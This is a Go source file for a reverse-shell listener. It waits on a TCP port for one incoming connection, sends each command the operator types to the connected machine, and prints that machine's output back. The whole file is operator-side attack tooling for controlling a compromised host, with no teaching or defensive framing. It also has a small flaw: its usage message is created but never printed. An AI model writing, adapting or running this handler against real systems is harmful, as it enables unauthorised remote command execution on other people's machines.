package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"os/signal"
	"strings"
)

const (
	connType = "tcp4"
)

func RevShellListener(port string) {
	fmt.Printf("Starting listener...\n")
	port = ":" + port
	conn, err := net.Listen(connType, port)
	if err != nil {
		fmt.Println("listening error: ", err)
		return
	}
	defer conn.Close()

	c, err := conn.Accept()
	if err != nil {
		fmt.Println(err)
		return
	}
	handleConnection(c)
}

func handleConnection(conn net.Conn) {
	fmt.Printf("Serving %s\n", conn.RemoteAddr().String())
	reader := bufio.NewReader(os.Stdin)

	go func() {
		_, err := io.Copy(os.Stdout, conn)
		if err != nil {
			fmt.Println("close connection...")
			return
		}
	}()

	quit := make(chan os.Signal, 1)
	signal.Notify(quit, os.Interrupt)
	for {
		select {
		case <-quit:
			return
		default:
			toExec, err := reader.ReadBytes('\n')
			if err != nil {
				fmt.Println("read error")
				break
			}

			temp := strings.TrimSpace(string(toExec))
			if temp == "exit" {
				return
			}
			//fmt.Printf("Executing: %s\n", temp)
			_, err = fmt.Fprintf(conn, "%s\n", temp)
			if err != nil {
				fmt.Println("Get error: " + err.Error())
				continue
			}
		}
	}
}

func main() {
	arguments := os.Args
	if len(arguments) == 1 {
		fmt.Errorf("Usage: ./reverse-tcp-server <port_number>")
		return
	}

	fmt.Printf("Starting\n")
	RevShellListener(arguments[1])
	fmt.Println("Finished")
}
